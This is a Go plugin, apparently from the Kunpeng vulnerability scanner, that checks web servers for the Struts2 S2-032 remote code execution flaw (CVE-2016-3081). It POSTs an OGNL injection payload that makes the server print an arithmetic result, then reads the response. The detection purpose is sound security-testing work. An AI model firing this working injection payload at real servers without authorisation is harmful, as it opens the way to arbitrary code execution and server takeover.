package goplugin

import (
	"net/http"
	"regexp"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type struts2_32 struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("struts2", &struts2_32{})
}
func (d *struts2_32) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Struts2 s2-032 远程代码执行",
		Remarks: "攻击者利用漏洞可在开启动态方法调用功能的Apache Struts 2服务器上执行任意代码，取得网站服务器控制权。",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://www.freebuf.com/vuls/102836.html",
			CVE:  "CVE-2016-3081",
			KPID: "KP-0040",
		},
	}
	return d.info
}
func (d *struts2_32) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *struts2_32) Check(URL string, meta plugin.TaskMeta) (b bool) {
	poc := "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23w%3d%23context.get(%23parameters.rpsobj[0]),%23w.getWriter().println(66666666-2),%23w.getWriter().flush(),%23w.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
	var checkURL string
	for _, url := range meta.FileList {
		if ok, _ := regexp.MatchString(`\.(do|action)$`, url); ok {
			checkURL = url
			break
		}
	}
	if checkURL == "" {
		return false
	}
	request, err := http.NewRequest("POST", checkURL, strings.NewReader(poc))
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "66666664") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
